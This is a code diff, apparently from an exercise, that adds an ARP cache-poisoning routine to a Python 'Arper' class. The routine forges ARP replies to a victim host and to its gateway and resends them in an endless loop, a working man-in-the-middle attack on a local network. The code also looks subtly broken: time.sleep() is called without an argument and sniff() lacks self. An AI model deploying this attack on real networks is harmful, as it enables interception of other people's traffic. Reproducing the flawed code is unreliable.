@@ -46,11 +46,50 @@ class Arper:
         # Sniff start to track attack by network sniffing
     
     def poison(self):
-        pass
-    
+        poison_victim = ARP() # poisoned ARP packet for the victim
+        poison_victim.op = 2
+        poison_victim.psrc = self.gateway # Sending gateway IP 
+        poison_victim.pdst = self.victim
+        poison_victim.hwdst = self.victimMac # but the attackers MAC 
+        
+        print(f'ip src: {poison_victim.psrc}')
+        print(f'ip dst: {poison_victim.pdst}')
+        print(f'mac src: {poison_victim.hwsrc}')
+        print(f'mac dst: {poison_victim.hwdst}')
+        print(poison_victim.summary())
+        print('-'*30)
+
+        poison_gateway = ARP() # poisoned ARP packet for the gateway
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway # Sending victim IP
+        poison_gateway.hwdst = self.gatewayMac # but attackers MAC
+        
+        print(f'ip src: {poison_gateway.psrc}')
+        print(f'ip dst: {poison_gateway.pdst}')
+        print(f'mac src: {poison_gateway.hwsrc}')
+        print(f'mac dst: {poison_gateway.hwdst}')
+        print(poison_gateway.summary())
+        print('-'*30)
+        
+        print('Beginning the ARP poison. [CTRL-C to stop]')
+        
+        while True: # Infinite loop of sending so the packet remain poisoned during the attack
+            sys.stdout.write('.')
+            sys.stdout.flush()
+            
+            try:
+                send(poison_victim)
+                send(poison_gateway)
+            except KeyboardInterrupt: # end the loop (ie the attack) by restoring the arp cache state
+                self.restore()
+                sys.exit()
+            else:
+                time.sleep()
+        
     def sniff():
         pass
-    
+       
     def restore(self):
         pass
     
